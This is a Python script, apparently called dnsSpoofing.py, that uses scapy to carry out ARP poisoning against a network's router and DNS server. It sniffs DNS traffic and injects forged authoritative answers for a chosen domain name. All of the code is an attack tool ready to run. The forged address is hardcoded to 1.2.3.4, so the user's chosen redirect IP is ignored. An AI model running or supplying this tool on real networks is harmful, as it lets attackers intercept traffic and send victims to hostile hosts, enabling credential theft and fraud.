import arpSpoofing
import sys
from scapy.all import Ether , ARP,conf, get_if_addr , get_if_hwaddr,srp1,sendp,sniff , IP,DNS ,DNSRR, send,UDP 
import subprocess, getopt
import time
import signal 
import arpUtil
import threading
options = {
    "name": None , 
    "addr":None , 
    "dnsaddr": None ,  
    "dnsmac":None ,  
    "targetMac" : None,
    "routerMac" : None,
    "mac ":None , #my mac
    "ip" : None , #my ip 
} 
def checkpacket(packet,name): 
    try: 
        for i in range(packet.ancount):
            if (packet[DNSRR][i].type == 1 or packet[DNSRR][i].type == 28) and packet[DNSRR][i].rrname.decode(encoding="ascii") == (name + '.'):
                return True,i 
    except Exception as  e : 
        ...
    return False , -1 


def throworkill(packet,name,newaddr): 
    packet[Ether].src = options["routerMac"]
    packet[Ether].dst = options["dnsmac"]
    pattern = newaddr.split('.')
    mine , index  = checkpacket(packet, name) 
    if mine : 
        packet.show()
        et = Ether(src =options["routerMac"] , dst =  options["dnsmac"] )
        ip =  IP(src=packet[IP].src,dst=packet[IP].dst)
        udp = UDP(dport=packet[UDP].sport,sport=packet[UDP].dport)
        dnsdiff= DNS(id=packet[DNS].id,qd=packet[DNS].qd,
                     aa=1,
                     qr=1,#respone 
                     tc = 0 , 
                     rd = 0 , 
                     ra= 0 , 
                     z= 0 , 
                     opcode =0 , 
                     qdcount=1,
                     ancount=1,
                     nscount=0,
                     arcount= 0 , 

                     an=DNSRR(rrname=packet[DNS][index].qd.qname,type='A',ttl=3600,rdata='1.2.3.4'))
        sendp( et/ip/udp/dnsdiff  ,iface=options["interface"],verbose=True)
    else : 
        sendp(packet,iface=options["interface"],verbose=False) 
   

def dispose(*args): 
    print("dispoe")
    arpUtil.changeArpTable(options["router"], options["routerMac"], options["dnsaddr"] , options["dnsmac"],options["interface"] )
    sys.exit(0)
def main()->None:
    '''
    usage: dnsSpoofing.py [-h] <dns ip> <domian name> <new ip> <interface>
    !!! - use sudo!
    optional arguments:
        -h, --help          show this help message and exit
    '''
    def redoit():
        while(True):
            arpUtil.changeArpTable(options["router"], options["routerMac"], options["dnsaddr"] , options["mac"],options["interface"] )
            time.sleep(1)
    if "-h" in sys.argv[1:] or "--help" in sys.argv[1:]: 
        print(main.__doc__)
        sys.exit(0)
    options["dnsaddr"]=sys.argv[1]
    options["name"]=sys.argv[2]
    options["addr"]=sys.argv[3]
    options["interface"]=sys.argv[4]
    options["dnsmac"]=arpUtil.getTargetMac(options["dnsaddr"], options["interface"])
    options["router"] = next(filter(lambda x : x[3] == options["interface"] , dict(conf.route.__dict__)["routes"]))[2]
    options["routerMac"] = arpUtil.getTargetMac(options["router"], options["interface"])
    options["mac"]=get_if_hwaddr(options["interface"])
    options["ip"]= get_if_addr(options["interface"])
    tr = threading.Thread(target=redoit)
    tr.start()
    sniff(
        lfilter= lambda x : IP in x and x[IP].dst == options["dnsaddr"] , prn = lambda x : throworkill(x,options["name"],options["addr"]) )
    
    signal.signal(signal.SIGINT, dispose)
    

    tr.join()
    signal.pause()


if __name__ == "__main__":
    main()